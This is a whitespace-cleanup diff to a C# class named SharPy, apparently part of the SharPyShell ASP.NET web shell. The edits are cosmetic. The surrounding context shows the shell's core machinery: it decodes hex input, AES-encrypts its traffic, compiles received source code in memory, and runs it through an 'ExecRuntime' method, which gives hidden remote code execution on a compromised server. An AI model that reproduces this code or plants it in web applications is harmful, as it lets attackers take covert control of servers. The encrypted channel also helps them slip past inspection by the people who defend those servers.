@@ -15,9 +15,9 @@ public class SharPy{
 			string byteValue = hexString.Substring(index * 2, 2);
 			data[index] = byte.Parse(byteValue, System.Globalization.NumberStyles.HexNumber);
 		}
-		return data; 
+		return data;
 	}
-	
+
 	private byte[] AESEnc(byte[] plain, byte[] Key, byte[] IV)
 	{
 		byte[] encrypted;
@@ -31,7 +31,7 @@ public class SharPy{
 				using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
 				{
 					csEncrypt.Write(plain, 0, plain.Length);
-					
+
 				}
 			encrypted = msEncrypt.ToArray();
 			}
@@ -80,7 +80,7 @@ public class SharPy{
 				CompilerParameters compilerParams = new CompilerParameters();
 				compilerParams.GenerateInMemory = true;
 				compilerParams.GenerateExecutable = false;
-				compilerParams.ReferencedAssemblies.Add("System.dll");	
+				compilerParams.ReferencedAssemblies.Add("System.dll");
 				results = provider.CompileAssemblyFromSource(compilerParams, runtime_code);
 				object o = results.CompiledAssembly.CreateInstance("SharPyShell");
 				MethodInfo mi = o.GetType().GetMethod("ExecRuntime");
@@ -88,7 +88,7 @@ public class SharPy{
 			}
 			catch(Exception exc){
 				string exc_out_str = exc.ToString()+"\n\n{{{SharPyShellError}}}";
-				for( int i=0; i<results.Errors.Count; i++ )                
+				for( int i=0; i<results.Errors.Count; i++ )
 					exc_out_str +=  i.ToString() + ": " + results.Errors[i].ToString();
 				runtime_exec_output=Encoding.UTF8.GetBytes(exc_out_str);
 			}
